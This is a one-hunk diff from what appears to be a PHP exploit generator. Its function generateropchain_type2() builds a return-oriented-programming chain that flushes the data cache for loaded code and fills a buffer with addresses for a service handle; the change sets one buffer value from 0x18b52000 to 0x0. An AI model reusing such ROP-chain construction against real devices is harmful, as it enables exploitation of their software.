@@ -1324,7 +1324,7 @@ function generateropchain_type2()
 	ropgen_callfunc($LINEAR_CODETMPBUF, 0x10000, 0x0, 0x0, $POPPC, $GSP_FLUSHDCACHE);//Flush the data-cache for the loaded code.
 
 	$databuf = array();
-	$databuf[0] = 0x18b52000;
+	$databuf[0] = 0x0;
 	$databuf[1] = $THROW_FATALERR;
 	$databuf[2] = $SRVPORT_HANDLEADR;
 	$databuf[3] = $SRV_REFCNT;
